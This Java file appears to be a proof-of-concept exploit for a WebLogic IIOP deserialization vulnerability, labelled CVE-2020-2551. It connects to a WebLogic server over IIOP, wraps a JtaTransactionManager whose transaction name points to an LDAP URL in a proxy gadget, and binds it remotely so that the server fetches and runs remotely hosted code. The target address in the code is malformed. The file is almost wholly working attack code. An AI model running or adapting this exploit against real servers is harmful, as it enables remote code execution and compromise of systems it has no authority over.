package CVE20202551;

import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;
import javax.naming.*;
import java.util.Hashtable;
import java.rmi.Remote;
import util.Gadgets;


/**
 * @ClassName: demo
 * @Description: TODO
 * @Author: Summer
 * @Date: 2020/8/3 15:55
 * @Version: v1.0.0
 * @Description:
 **/
public class demo {

    public final static String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";

    public static void main(String[] args) throws Exception {
        Hashtable<String, String> env = new Hashtable<String, String>();
        env.put("java.naming.factory.initial", JNDI_FACTORY);
        env.put("java.naming.provider.url", "iiop://192.168.143:7001"); // 127.0.0.1 = 2130706433
        Context context = new InitialContext(env);

        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName("ldap://127.0.0.1:1389/Weblogicpoc");
        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap("pwned", jtaTransactionManager), Remote.class);

        context.bind("hello", remote);
    }


}
